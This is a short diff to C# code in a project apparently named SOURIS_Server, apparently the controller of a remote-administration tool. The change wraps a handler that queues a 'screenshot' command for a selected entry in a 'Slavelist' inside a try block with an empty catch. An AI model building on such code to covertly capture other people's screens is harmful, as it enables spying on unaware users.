@@ -209,8 +209,15 @@ namespace SOURIS_Server
         }
         private void Screenshot(object sender, RoutedEventArgs e)
         {
-            int selected = listView1.SelectedIndex;
-            Slavelist[selected].Nextinteract = "screenshot";
+            try
+            {
+                int selected = listView1.SelectedIndex;
+                Slavelist[selected].Nextinteract = "screenshot";
+            }
+            catch
+            {
+
+            }
         }
     }
 }
